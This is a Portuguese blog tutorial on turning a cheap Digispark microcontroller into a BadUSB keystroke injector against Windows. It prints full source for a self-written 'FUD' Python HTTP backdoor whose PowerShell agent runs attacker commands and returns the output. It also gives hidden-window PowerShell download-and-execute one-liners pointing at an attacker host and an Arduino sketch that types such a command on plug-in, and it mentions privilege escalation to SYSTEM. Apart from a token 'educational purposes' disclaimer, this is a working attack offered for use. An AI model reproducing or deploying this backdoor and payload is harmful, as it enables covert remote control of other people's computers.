---
layout: post
title: USB bad usando um microcontroller [digispark]
categories: [c++ arduino]
tags: [c++,arduino,windows,powershell,digispark]
fullview: true
comments: true
---

hello, everyone!

warnning: já vou avisando que esse artigo é **100 % para fins educacionais**, logo não irei me responsabilizar
pelo mal uso das informações que irei compartilhar aqui. let's go...


### Introdução

Antes de mais nada, vamos entender o porque estou escrevendo sobre isso somente agora. Há alguns anos atrás ( quando parei de escrever pro blog :( ) em umas das maiores conferências de hacking e segurança da informação do mundo (Blackhat) a falha no padrão USB foi apresentada por **(Karsten Nohl + Jakob Lell)**. A falha era sinistra porque eu sabia que não tinha como ser corrigida facilmente (atualização de firmware para pendrive ? ). Nesse tempo eu não tinha dinheiro pra comprar um pendrive exploitável (até hoje não tenho), a vontade de escrever e testar a falha foi por "água abaixo".

### Como funciona a falha
!["backgroundUSB"](/images/badUSB/backgroundUSB2.png)

A ideia dos caras era basicamente reprogramar o microcontroller para transformar em um HID (human interface device), que nesse caso seria fazer a máquina ler o driver como um keyboard (teclado) e não um Mass Storage, fazendo isso é possível simular qualquer tipo de operação usando o teclado (quem ja ficou sem teclado um dia sabe como é) para ownar. A imagem acima mostra como funciona um pendriver, temos **firmware controller** que não é visível pelo usuário  e **Mass Storage** onde fica todos os dados (memoria flash), mas nem todos os devices tem essa capacidade ser reprogramado para transformar em um periférico (hoje em dia). O Data traveler dt111 **firmware (phision ps2151-03)** somente nessa versão do firmware, pois hoje em dia no mercado você encontrarar esse pendriver,mas com a versão **(ps2151-05)** que tem proteção contra esse tipo de modificação. [list devices supported](https://github.com/brandonlw/Psychson/wiki/Known-Supported-Devices).
OBS: não vou usar esse método (só estou demostrando como funciona )

!["usb_recon"](/images/badUSB/usbrecog.png)

Qualquer driver de um dispositivo físico, lógico ou virtual deve fornecer algum tipo de nome para seus clientes no **user-mode** (modo usuário). Usando o nome, um aplicativo de user-mode (ou outro componente do sistema) identifica o dispositivo do qual está solicitando. Nos Windows mais antigos (NT não sou dessa época) os drivers era nomeados e depois registrado pelo sistema, partir do Windows 2000 (nem sabia o que era computador) os drivers não eram nomeados. Em vez disso, eles usam classes de interface de dispositivo. Uma classe de interface de dispositivo é uma maneira de exportar a funcionalidade de dispositivo e driver para outros componentes do sistema, incluindo outros drivers, bem como aplicativos de user-mode e cada classe de interface de dispositivo está associada a um GUID. O sistema define GUIDs para classes de interface de dispositivo comuns em arquivos de cabeçalho específicos do dispositivo. Os fornecedores podem criar classes de interface de dispositivo adicionais.

Por exemplo, três tipos diferentes de dispositivos de mouse podem ser membros da mesma classe de interface de dispositivo e cada driver registra seu dispositivo como um membro da classe de interface GUID_DEVINTERFACE_MOUSE. Este GUID é definido no arquivo de cabeçalho Ntddmou.h.
``` c
DEFINE_GUID(GUID_DEVINTERFACE_MOUSE, \
  0x378de44c, 0x56ef, 0x11d1, 0xbc, 0x8c, 0x00, 0xa0, 0xc9, 0x14, 0x05, 0xdd);

#define GUID_CLASS_MOUSE GUID_DEVINTERFACE_MOUSE /* Obsolete */
```
Normalmente, os drivers registram apenas uma classe de interface. No entanto, os drivers para dispositivos que possuem uma funcionalidade especializada além da definida para sua classe de interface padrão também podem se registrar para uma classe adicional, como mostrado no slide da srlabs.
```
Invalid class (0x00)
Audio class (0x01)
HID class(0x03)
Image class (0x06)
Printer class (0x07)
Mass storage class (0x08)
Smart card class (0x0B)
Audio/video class (0x10)
Wireless controller (such as, wireless USB host/hub) (0xE0)
```
![loaddriver](/images/badUSB/loaddriverusb.png)

### Evolução do ataque

A [**hak5**](https://www.hak5.org/) lançou um dispositivo com firmware modificado com vários payload para diferentes senários de ataques o famoso [usb-rubber-ducky-deluxe](https://hakshop.com/products/usb-rubber-ducky-deluxe). O USB Rubber Ducky é uma ferramenta de injeção de teclas disfarçada como uma unidade flash genérica. Os computadores o reconhecem como um teclado normal e aceitam payloads de pressionamento de tecla pré-programadas com mais de 1000 palavras por minuto (texto do site). (esse bagui é caro pra caralhooooo)

![rubberducky](/images/badUSB/rubberducky.jpg)

detalhes hardware:
```
Atmel 32bit AVR Microcontroller AT32UC3B1256
MicroSD card reader
Micro push-button
Multi-color LED indicator
JTAG Interface (can be used for I/O)
Standard “Type A” USB connector
```
As coisas começaram a ficar interessante pra mim, quando chegou os microcontrollers (Arduino). A ideia era carregar um novo firmware no arduino é tranaforma-lo em HID, você vai encontrar vários tutoriais na net, mostrando como um [Duckuino](https://forums.hak5.org/topic/32719-payload-converter-duckuino-duckyscript-to-arduino/) funciona e como cria-lo.

exemplo de code:
``` c
#include <HID-Project.h>
#include <HID-Settings.h>

// Esse código simplemente faz seu arduino
// abrir o notepad.exe e digitar "Hello World, Duckuino!!!"
// qualquer payload do rubberducky pode ser convertido para Arduino Pro MICRO ATmega32U4
// site : https://d4n5h.github.io/Duckuino/


// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("notepad");

  delay(500);

  typeKey(KEY_RETURN);

  delay(750);

  Keyboard.print("Hello World, Duckuino!!!");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}

```
Essa é uma solução barata para criar seu próprio USB bad, sendo que no mercado existe vários arduino que podem ser usado para transforma-lo em um HID, bem menores como [Arduino Pro MINI](https://store.arduino.cc/usa/arduino-pro-mini).

### Iniciando Projeto
A ideia era usar o Pro Micro/Leonardo( comprei e não uso ), mas encontrei um simples problema que poderia ser resolvido usando um adaptador OTG fêmea. Sendo asssim, decidir procurar outro **arduino** que já tenha um USB por padrão, mas não encontrei um que fosse barato e que tivesse a mesma capacidade de momoria que o Micro (com o micro ainda seria possível adicionar um cartão SD para carregar os payloads). Pesquisando na net encontrei um dispositivo super barato chamado **Digispark**.

O **Digispark** é uma placa de desenvolvimento com o microcontrolador ATMEL AVR ATTINY85, que pode ser encaixada diretamente na USB do computador e programada utilizando a IDE do Arduino.

!["digispark"](/images/badUSB/digspark.jpg)

O Digispark executa a versão 1.02 do bootloader **“micronucleus tiny85”**, tem 6 pinos de I/O, dos quais 3 podem ser usados como PWM, **8K de memória flash** e suporta alimentação externa. O mais legal é que não precisa de cabo para programação, basta plugar e descarregar o programa! o que eu precisava :)

Especificações:
```
– Microcontrolador Atmel ATTINY85 (datasheet)
– Memória flash: 8KB
– EEPROM: 512 bytes
– SRAM: 512 bytes
– 6 pinos de I/O
– Tensão de operação: 5VDC (USB) – 7 à 35V (alimentação externa)
– Interfaces I2C e SPI
– Conexão USB
– Conversor analógico digital em 4 pinos
– Baixo consumo de energia
– Dimensões: 26,5 x 18,5 x 4,5mm
```

Você encontra essa coisinha bem barata no mercado livre (ou compre pelo Aliexpress recomendo ). O ponto negativo é que são apenas fucking **8K de memória flash** o que inicialmente me fez desanimar, mas resolvi esse problema usando um simples powershell.

### Requísitos

- 1 **Digspark**
- Arduino IDE instalado
- download driver [DigistumpArduino](https://github.com/digistump/DigistumpArduino/releases)
- Configurar Arduino IDE [how to install](https://digistump.com/wiki/digispark/tutorials/connecting)
- backdoor (meterpreter, Empire ,netcat, powershell, [PSd00r](https://github.com/mh4x0f/mh4x0f-blog/blob/master/PSd00r.py))

Existe várias shell que rodam a partir de um request usando powershell por exemplo o [web delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/), [Empire](https://www.powershellempire.com/) e etc. O ponto negativo é que muitas já são detectadas facilmente pelos AV (Anti-virus), mas são recheadas de recursos para várias situações. Sabendo disso, resolvi escrever minha própria shell para esse artigo, uma shell simples que devolve um reverse powershell command line.

``` python
#codding: utf-8

# MIT License
#
# Copyright (c) 2018 Marcos Nesster
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
import base64
import argparse


code =   """
            function getUser() {{
                $string = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) | Out-String
                $string = $string.Trim()
                return $string
            }}

            function getComputerName() {{
                $string = (Get-WmiObject Win32_OperatingSystem).CSName | Out-String
                $string = $string.Trim()
                return $string
            }}


            $resp = "http://{SERVER}:{PORT}/rat"
            $w = New-Object Net.WebClient
	        while($true)
	        {{
	        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
	        $r_get = $w.DownloadString($resp)
            $d = [System.Convert]::FromBase64String($r_get);
            $Ds = [System.Text.Encoding]::UTF8.GetString($d);

	        while($r) {{
		        $output = invoke-expression $Ds | out-string
		        $w.UploadString($resp, $output)
		        break
	        }}
	        }}

        """


class myHandler(BaseHTTPRequestHandler):
    ''' simple backdoor http powershell command '''

    def log_message(self, format, *args):
        """ hide log output  """
        return

    def do_GET(self):
        if (self.path == "/connect"):
            self.send_response(200);
            self.send_header('Content-type',1);
            self.end_headers();
            self.wfile.write(code);

        elif "/rat" == self.path:
            self.send_response(200)
            CMD = base64.b64encode(raw_input("(PSd00r) > "))
            self.send_header('CMD',CMD) # simple test using header for send commands
            self.end_headers()
            self.wfile.write(CMD)

    def do_POST(self):
        if "/rat" == self.path:
            content_len = int(self.headers.getheader('content-length', 0))
            post_body = self.rfile.read(content_len)
            print(post_body)
            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()


_author  = 'mh4x0f '
_version = '0.1'

def banner():
    print("""

______  _____     _ _____  _____
| ___ \/  ___|   | |  _  ||  _  |
| |_/ /\ `--.  __| | |/' || |/' |_ __
|  __/  `--. \/ _` |  /| ||  /| | '__|
| |    /\__/ / (_| \ |_/ /\ |_/ / |
\_|    \____/ \__,_|\___/  \___/|_|

simple backdoor http powershell FUD
    """)

if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(
    description="PSd00r - simple backdoor http powershell FUD")
    parser.add_argument('-i','--ip-addr',  
    dest='ip',help='set the ip address to server',default='0.0.0.0')
    parser.add_argument('-p','--port',  
    dest='port',help='set the port the handler',default=8000)
    parser.add_argument('-v','--version',
    action='version', dest='version',version='%(prog)s v{}'.format(_version))
    parser_load = parser.parse_args()
    print('Author: {} P0cL4bs Team'.format(_author))
    print('Version: {} dev\n'.format(_version))
    print('[*] Starting the server...')
    print('[*] HOST: {}:{}'.format(parser_load.ip,parser_load.port))
    try:
        server = HTTPServer((parser_load.ip, parser_load.port), myHandler)
        d = dict()
        d['SERVER'] = parser_load.ip
        d['PORT'] = parser_load.port
        code = code.format(**d)
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()

```

payload:
powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString("http://IPATTACKER:PORTATTACKER/connect"))

O [PSd00r](https://github.com/mh4x0f/mh4x0f-blog/blob/master/PSd00r.py) funciona da seguinte maneira, cria um handler server http request simples POST e GET. A máquina alvo envia um request **"/connect"** e posteriomente cria um loop com código enviado pelo attacker, assim podemos executar comandos e importar funcões,upload, download, exec code C# e C# Reflection. Tudo na mão mesmo, lógico que esses features podem ser implementados na tool futuramente.

### Configuração Digspark

Chegando aqui, já acredito que você deve ter seguido o [tutorial](https://digistump.com/wiki/digispark/tutorials/connecting) de instalação do **digispark**, agora podemos começar a criar nosso canivete suiço. Transformar nosso digspark em um HID é bem simples, pois quando você seguiu o tutorial acima usando a IDE do arduino, você importou  todas lib para suporte do digispark. let's go configuration:

1 - Selecionar GPU core clock frequency [Menu->Ferramenta]

![digspark1](/images/badUSB/digispark1.png)

2 - Escolher um exemplo usando o keyboard [File->Exemplos->DigisparkKeyboard->Keyboard]

![digspark2](/images/badUSB/digispark2.png)

3 - "Setar" o gravador ou programador, responsável por enviar o programa desenvolvido para a memória de programa do microcontrolador. [Ferramenta->Programador->USBTINYISP]

![digspark3](/images/badUSB/digispark3.png)

4 - Esse é um exemplo simples que sai digitando **"hellow digispark"**

![digspark4](/images/badUSB/digispark4.png)

Seguindo os 4 passos você já temos um HID funcional, ao conectar em uma máquina ele sai digitando loucamente. Note que no 4 passo o código exemplo inclui o header **"DigiKeyboard.h"**, esse header cria um objeto/instância chamado "DigiKeyboard" da classe **DigiKeyboardDevice** que serve como uma API para simular um teclado.
```c
/* Keyboard usage values, see usb.org's HID-usage-tables document, chapter
 * 10 Keyboard/Keypad Page for more codes.
 */
#define MOD_CONTROL_LEFT    (1<<0)
#define MOD_SHIFT_LEFT      (1<<1)
#define MOD_ALT_LEFT        (1<<2)
#define MOD_GUI_LEFT        (1<<3)
#define MOD_CONTROL_RIGHT   (1<<4)
#define MOD_SHIFT_RIGHT     (1<<5)
#define MOD_ALT_RIGHT       (1<<6)
#define MOD_GUI_RIGHT       (1<<7)
```
Os defines são pode ser usados usando o metodo **sendKeyStroke(byte keyStroke, byte modifiers)**, por exemplo você pode fazer com que seu digspark abra o menu do windows usando o código abaixo.
``` c
DigiKeyboard.sendKeyStore(0, MOD_GUI_LEFT)
```
Você também não precisa enviar um delay logo depois que usar esse método porque **sendKeyStroke** já executa no próprio método um delay_ms(5), como já sabe o println(char) faz com que seu dispositivo escreve o texto digitado.
``` c
void sendKeyStroke(byte keyStroke, byte modifiers) {
  while (!usbInterruptIsReady()) {
    // Note: We wait until we can send keystroke
    //       so we know the previous keystroke was
    //       sent.
    usbPoll();
    _delay_ms(5); // aqui
  }
}
```

### Criando um custom (USB rubberducky )

Como eu já tinha citado sobre o nosso pequeno problema, es que temos apenas **8K de memória flash** e se quisermos usar um payload, por exemplo, do [WiFi-password-grabber](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber) que é capaz de coletar todos os passwords wireless salvo e enviar para um determinado email, mesmo sendo possível converter todo código do USB-Rubber-Ducky, estamos limitado por falta de memoria que certamente ir faltar. Porém, podemos usar o **powershell** como vetor de ataque, iremos apenas fazer com que nosso dispositivo abrir o prompt de comando (**cmd**) e posteriomente chamar o powershell passando como parêmentro request em algum código (raw) hospeado na net ou no meu caso usar minha shell para abrir uma conexão reversa com a máquina alvo.

Por exemplo, podemos usar esse método para executar remotamente qualquer código na maquina usando script em powershell.
``` powershell
powershell.exe -ep Bypass -nop -noexit -c iex ((New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′))
```
Ou simplemente mudar a proteção de tela de uma maquina usando esse [script.ps1](https://gist.githubusercontent.com/mh4x0f/fe54a1b4d06b3dc95b3c12e03014d9f4/raw/ebbfeabea4f1f7c06a9c40ca768fef7476711af3/mlp.ps), OBS: código funciona apenas em windows 7 e 8 :

O nosso código irá ficar mais o menos assim:
``` c
#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(5000);
  // abre o menu iniciar do widnows
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);

  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd"); // digita no campo de pesquisa
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER); // abre o prompt de comando
  DigiKeyboard.delay(1000);
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  DigiKeyboard.println("powershell -windowstyle hidden iex (wget http://bit.ly/2f1uwGD)");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.delay(5000);
}

```
O link http://bit.ly/2f1uwGD é exatamente o código que faz download e uma imagem e "seta" como plano de fundo do sistema alvo. Para usar o **PSd00r** basta apenas modificar o link acima por "http://IPATTACKER:PORTATTACKER/connect" , e com isso a mágica acontece temos uma reverse powershell command line e dai podemos usar outros métodos de **post exploration** para ganhar mais privilégio no sistema, de preferência **NT AUTHORITY\SYSTEM**.

![demo](/images/badUSB/demoPSdoor.gif)

### Conclusão

Dentre todas opções dos dispositivos encontrado no mercado,o **digspark** é o mais barato de todos (não é a toa que eu escolhi esse) sem contar que praticamente em termo de efetividade, ele não deixa a desejar. Lógico que o **rubberducky** pode se adequar a qualquer senário por ter vários payloads para diferentes. Usar um backdoor http ou https é a melhor solução, pois com qualquer servidor remoto (até free) com support a python pode ser usado para montar um server. Em relação a custo benefício, você vai encontrar o digspark por $ 1 dólar na net sendo que um rubberducky cega a ser $ 45 fucking dólar. Se você encontrar um rapaz em alguma conferência com um desse como pingente, prazer **mh4x0f**.


Referências:
```
https://srlabs.de/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf
https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-headers/include/ntddmou.h
https://docs.microsoft.com/en-us/windows-hardware/drivers/usbcon/updating-the-app-manifest-with-usb-device-capabilities
https://forums.hak5.org/topic/32719-payload-converter-duckuino-duckyscript-to-arduino/
https://github.com/micronucleus/micronucleus
https://digistump.com/wiki/digispark/tutorials/connecting
https://github.com/digistump/DigisparkArduinoIntegration/tree/master/libraries/DigisparkKeyboard
https://github.com/mh4x0f/mh4x0f-blog/blob/master/PSd00r.py
```
